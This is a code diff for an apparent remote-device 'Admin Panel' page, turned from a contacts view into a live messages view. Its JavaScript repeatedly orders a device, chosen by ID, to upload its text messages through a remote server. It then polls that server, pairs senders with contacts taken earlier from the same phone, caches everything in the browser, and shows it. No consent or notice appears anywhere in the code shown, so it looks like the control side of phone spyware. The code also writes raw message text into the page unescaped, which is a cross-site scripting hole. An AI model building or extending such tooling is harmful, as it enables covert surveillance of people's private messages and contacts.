@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Contacts - Admin Panel</title>
+    <title>Messages - Admin Panel</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         :root {
@@ -31,7 +31,7 @@
             padding-bottom: 20px;
         }
 
-        /* --- Header --- */
+        /* --- Header (Same as Contacts) --- */
         .header {
             position: sticky; top: 0;
             background: rgba(0, 0, 0, 0.95);
@@ -69,7 +69,7 @@
         
         .search-input {
             width: 100%;
-            background: #1c1c1e; /* Match iOS search bar */
+            background: #1c1c1e;
             border: none;
             padding: 10px 35px;
             border-radius: 10px;
@@ -83,34 +83,38 @@
             color: var(--text-muted); font-size: 0.9rem;
         }
 
-        /* --- Contact List --- */
-        .contact-list {
+        /* --- SMS List --- */
+        .sms-list {
             display: flex; flex-direction: column;
             padding: 0 15px;
+            gap: 12px;
+            margin-top: 15px;
         }
 
-        .contact-card {
+        .sms-card {
             background: var(--card-bg);
             padding: 15px;
-            border-bottom: 1px solid var(--border-color);
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
+            border-radius: 12px;
+            border: 1px solid var(--border-color);
+            display: flex; flex-direction: column; gap: 8px;
         }
-        
-        .contact-card:first-child { border-top-left-radius: 12px; border-top-right-radius: 12px; }
-        .contact-card:last-child { border-bottom-left-radius: 12px; border-bottom-right-radius: 12px; border-bottom: none; }
 
-        .contact-info { display: flex; flex-direction: column; gap: 4px; }
-        
-        .contact-name { font-size: 1rem; font-weight: 600; color: #fff; }
-        .contact-number { font-size: 0.85rem; color: var(--text-muted); }
+        .sms-header {
+            display: flex; justify-content: space-between; align-items: flex-start;
+        }
 
-        .action-btn {
-            color: var(--blue-accent);
-            font-size: 1.2rem;
-            padding: 10px;
-            text-decoration: none;
+        .sender-info { display: flex; flex-direction: column; }
+        .sender-name { font-size: 1rem; font-weight: 600; color: #fff; }
+        .sender-number { font-size: 0.75rem; color: var(--text-muted); margin-top: 2px;}
+
+        .time-badge {
+            font-size: 0.7rem; color: var(--text-muted);
+            white-space: nowrap;
+        }
+
+        .message-body {
+            font-size: 0.95rem; color: #e0e0e0; line-height: 1.4;
+            word-wrap: break-word; white-space: pre-wrap;
         }
 
         .status-msg { text-align: center; color: var(--text-muted); margin-top: 50px; font-size: 0.9rem; }
@@ -122,19 +126,19 @@
         <div class="header">
             <div class="top-row">
                 <a href="index.html" class="back-btn"><i class="fa-solid fa-chevron-left"></i> Back</a>
-                <span class="page-title">Contacts</span>
+                <span class="page-title">Messages</span>
                 <div class="live-indicator"><i class="fa-solid fa-circle blink"></i> Live</div>
             </div>
             
             <div class="search-box">
                 <i class="fa-solid fa-magnifying-glass search-icon"></i>
-                <input type="text" id="searchInput" class="search-input" placeholder="Search name or number..." onkeyup="filterContacts()">
+                <input type="text" id="searchInput" class="search-input" placeholder="Search message..." onkeyup="filterSMS()">
             </div>
         </div>
 
-        <div id="contact-list" class="contact-list">
+        <div id="sms-list" class="sms-list">
             <div class="status-msg">
-                <i class="fa-solid fa-spinner fa-spin"></i><br><br>Loading Contacts...
+                <i class="fa-solid fa-spinner fa-spin"></i><br><br>Loading Messages...
             </div>
         </div>
     </div>
@@ -143,122 +147,159 @@
     const SERVER_URL = "https://child-v9no.onrender.com";
     const urlParams = new URLSearchParams(window.location.search);
     const DEVICE_ID = urlParams.get('id') ? urlParams.get('id').toUpperCase() : null;
+    
+    const storageKeySMS = `sms_${DEVICE_ID}`;
     const storageKeyContacts = `contacts_${DEVICE_ID}`;
 
-    let allContacts = [];
-    let isFetching = false;
+    let allSMSData = []; 
+    let contactMap = {}; 
+    let isFetching = false; 
 
     document.addEventListener("DOMContentLoaded", function() {
         if (!DEVICE_ID) {
-            document.getElementById("contact-list").innerHTML = '<div class="status-msg" style="color:red">Error: No Device ID Found</div>';
+            document.getElementById("sms-list").innerHTML = '<div class="status-msg" style="color:red">Error: Device ID Missing</div>';
             return;
         }
-
-        // Load cached data first
-        const savedData = localStorage.getItem(storageKeyContacts);
-        if (savedData) {
-            try {
-                allContacts = JSON.parse(savedData);
-                renderContacts(allContacts);
-            } catch(e) {}
-        }
-
+        
+        prepareContactMap();
+        loadFromStorage();
         startLiveSystem();
     });
 
+    // 1. Prepare Names from Contacts Storage
+    function prepareContactMap() {
+        try {
+            const savedContacts = localStorage.getItem(storageKeyContacts);
+            if (savedContacts) {
+                const contacts = JSON.parse(savedContacts);
+                if(Array.isArray(contacts)){
+                    contacts.forEach(c => {
+                        if(c.number && c.name) {
+                            let cleanNum = String(c.number).replace(/\D/g, '').slice(-10);
+                            contactMap[cleanNum] = c.name;
+                        }
+                    });
+                }
+            }
+        } catch(e) { console.error("Contact Map Error", e); }
+    }
+
+    function getContactName(originalNum) {
+        if (!originalNum) return "Unknown";
+        let strNum = String(originalNum);
+        let cleanNum = strNum.replace(/\D/g, '').slice(-10);
+        return contactMap[cleanNum] || strNum;
+    }
+
+    // 2. Load Local Data (Instant Show)
+    function loadFromStorage() {
+        const savedData = localStorage.getItem(storageKeySMS);
+        if (savedData) {
+            try {
+                allSMSData = JSON.parse(savedData);
+                renderSMS(allSMSData);
+            } catch(e) {}
+        }
+    }
+
+    // 3. Live System
     function startLiveSystem() {
-        sendCommand(); // Ask phone to update contacts
-        fetchContacts(); // Fetch from server
-        
-        // Contacts don't change often, so we update slower
-        setInterval(sendCommand, 20000); 
-        setInterval(fetchContacts, 5000);
+        sendCommand();
+        fetchSMS();
+        setInterval(sendCommand, 15000); 
+        setInterval(fetchSMS, 5000); 
     }
 
     function sendCommand() {
         fetch(`${SERVER_URL}/api/send-command`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ device_id: DEVICE_ID, command: 'contacts' }) // Command 'contacts' check karein
-        }).catch(e => console.log("Command error:", e));
+            body: JSON.stringify({ device_id: DEVICE_ID, command: 'sms' })
+        }).catch(e => console.log("Command Error (Ignored)")); 
     }
 
-    function fetchContacts() {
+    function fetchSMS() {
         if(isFetching) return;
         isFetching = true;
 
-        // URL check: Ensure endpoint is correct (/contacts)
-        fetch(`${SERVER_URL}/api/get-data/${DEVICE_ID}/contacts?t=${Date.now()}`)
+        fetch(`${SERVER_URL}/api/get-data/${DEVICE_ID}/sms?t=${Date.now()}`)
             .then(res => {
                 if(!res.ok) throw new Error("Server Error: " + res.status);
                 return res.json();
             })
             .then(data => {
                 if (data && Array.isArray(data) && data.length > 0) {
-                    // Check if data changed
-                    if (JSON.stringify(data) !== JSON.stringify(allContacts)) {
-                        allContacts = data.sort((a, b) => (a.name || "").localeCompare(b.name || ""));
-                        localStorage.setItem(storageKeyContacts, JSON.stringify(allContacts));
+                    if (data.length !== allSMSData.length || JSON.stringify(data[0]) !== JSON.stringify(allSMSData[0])) {
+                        allSMSData = data;
+                        localStorage.setItem(storageKeySMS, JSON.stringify(data));
                         
                         const query = document.getElementById('searchInput').value;
-                        if(query === "") renderContacts(allContacts);
-                        else filterContacts();
+                        if(query === "") renderSMS(allSMSData);
+                        else filterSMS();
                     }
-                } else if (!allContacts.length) {
-                    document.getElementById("contact-list").innerHTML = '<div class="status-msg">No contacts found on device.</div>';
+                } else if (!allSMSData.length) {
+                    document.getElementById("sms-list").innerHTML = '<div class="status-msg">No Messages Found on Device.</div>';
                 }
             })
             .catch(err => {
-                console.error("Fetch Error:", err);
-                if(allContacts.length === 0) {
-                    document.getElementById("contact-list").innerHTML = `<div class="status-msg" style="color:red">Connection Failed.<br><small>${err.message}</small></div>`;
+                console.error("Fetch Error", err);
+                if(allSMSData.length === 0) {
+                    document.getElementById("sms-list").innerHTML = `<div class="status-msg" style="color:red">Connection Failed.<br><small>${err.message}</small></div>`;
                 }
             })
             .finally(() => { isFetching = false; });
     }
 
-    function filterContacts() {
+    function filterSMS() {
         const query = document.getElementById('searchInput').value.toLowerCase();
-        const filtered = allContacts.filter(c => {
-            const name = String(c.name || "").toLowerCase();
-            const num = String(c.number || "").toLowerCase();
-            return name.includes(query) || num.includes(query);
+        const filtered = allSMSData.filter(sms => {
+            const body = String(sms.body || "").toLowerCase();
+            const address = String(sms.address || "").toLowerCase();
+            const name = String(getContactName(sms.address)).toLowerCase();
+            return body.includes(query) || address.includes(query) || name.includes(query);
         });
-        renderContacts(filtered);
+        renderSMS(filtered);
     }
 
-    function renderContacts(data) {
-        const listContainer = document.getElementById("contact-list");
+    function renderSMS(data) {
+        const listContainer = document.getElementById("sms-list");
         
-        if (!data || data.length === 0) {
-            listContainer.innerHTML = '<div class="status-msg">No contacts found.</div>';
+        if (!data || !Array.isArray(data) || data.length === 0) {
+            listContainer.innerHTML = '<div class="status-msg">No messages found.</div>';
             return;
         }
 
-        // Prevent heavy rendering
-        const displayData = data.slice(0, 200);
+        const displayData = data.slice(0, 100); // Optimization: Show last 100 only
 
-        const htmlString = displayData.map(c => {
-            const name = c.name || "Unknown";
-            const number = c.number || "";
-            
-            // Generate Avatar Initials
-            const initial = name.charAt(0).toUpperCase();
+        const htmlString = displayData.map(sms => {
+            try {
+                const rawAddress = sms.address || "Unknown";
+                const name = getContactName(rawAddress);
+                const isSaved = name !== rawAddress;
 
-            return `
-                <div class="contact-card">
-                    <div style="display:flex; align-items:center; gap:12px;">
-                        <div style="width:40px; height:40px; background:#333; border-radius:50%; display:flex; align-items:center; justify-content:center; font-weight:bold; color:#fff;">
-                            ${initial}
+                // --- Date Fix Logic ---
+                // Agar "26/01/2026" jaisa string hai to waisa hi dikhao.
+                // Agar timestamp number hai to convert karo.
+                let displayDate = sms.date;
+                if(!isNaN(sms.date) && String(sms.date).length > 12) {
+                     displayDate = new Date(parseInt(sms.date)).toLocaleString();
+                }
+
+                const bodyText = sms.body ? String(sms.body) : "";
+
+                return `
+                    <div class="sms-card">
+                        <div class="sms-header">
+                            <div class="sender-info">
+                                <span class="sender-name">${isSaved ? name : rawAddress}</span>
+                                ${isSaved ? `<span class="sender-number">${rawAddress}</span>` : ''}
+                            </div>
+                            <span class="time-badge">${displayDate}</span>
                         </div>
-                        <div class="contact-info">
-                            <span class="contact-name">${name}</span>
-                            <span class="contact-number">${number}</span>
-                        </div>
+                        <div class="message-body">${bodyText}</div>
                     </div>
-                    <a href="tel:${number}" class="action-btn"><i class="fa-solid fa-phone"></i></a>
-                </div>
-            `;
+                `;
+            } catch (err) { return ""; }
         }).join('');
 
         listContainer.innerHTML = htmlString;
